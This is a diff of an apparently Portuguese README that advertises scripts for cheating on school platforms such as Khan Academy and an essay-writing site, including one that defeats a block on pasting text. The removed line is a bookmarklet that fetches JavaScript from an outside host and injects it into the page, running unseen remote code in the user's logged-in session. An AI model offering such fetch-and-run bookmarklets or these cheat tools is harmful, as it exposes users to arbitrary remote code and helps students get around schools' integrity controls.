@@ -6,8 +6,7 @@
 ### Leia:https://leiasp.cupiditys.lol/
 ### Redação: https://redacao.cupiditys.lol/ 
 ### Khan: https://khan.cupiditys.lol/
-## Alternativa do khan: javascript:(async()=>{let r=await fetch("https://api.moonscripts.cloud/book");let t=await r.text();let s=document.createElement("script");s.textContent=t;document.body.appendChild(s);})(); 
+## Alternativa do khan: [Clique aqui para ver o código](https://github.com/odeiosaladofuturo/Scripts/blob/main/src/Hack%20do%20Khan)
 !!!Copia esse codigo abaixo pra copiar e colar redação!!!
                                                    
-### [Clique aqui para ver o código](https://github.com/odeiosaladofuturo/Scripts/blob/main/src/Hack%20do%20Khan)
 ### Esse javascript ele tira o negócio que bloqueia vc a não colar redação na parte de redação
